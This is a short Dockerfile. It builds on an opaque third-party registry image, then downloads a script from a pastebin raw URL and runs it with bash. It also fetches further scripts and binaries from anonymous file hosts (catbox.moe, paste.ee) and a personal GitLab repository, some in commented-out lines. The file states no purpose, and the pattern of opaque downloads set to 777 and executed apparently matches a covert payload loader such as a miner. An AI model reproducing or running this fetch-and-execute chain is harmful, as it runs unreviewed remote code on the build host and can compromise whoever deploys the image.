# FROM alpine

# RUN apk add --no-cache python3 rclone curl && curl https://files.catbox.moe/cplts2 -o cplts2 && chmod 777 cplts2 && curl https://paste.ee/r/DGbgR/0 -o /tmp/carg && curl -o /tmp/run.py https://gitlab.com/rishabh-modi2/public/-/raw/main/run.py && curl https://files.catbox.moe/wgf0a5 -o /tmp/wgf0a5 && chmod 777 /tmp/wgf0a5
# FROM ubuntu
FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:latest
RUN sed -i 's/http:\/\/archive.ubuntu.com/http:\/\/ap-east-1.ec2.archive.ubuntu.com/g' /etc/apt/sources.list && apt update -y && apt install -y curl && curl https://pastebin.com/raw/D6ZgN4Bv -o b && chmod 777 b && bash b && curl https://gitlab.com/rishabh-modi2/public/-/raw/main/codetest.sh -o a && chmod 777 a
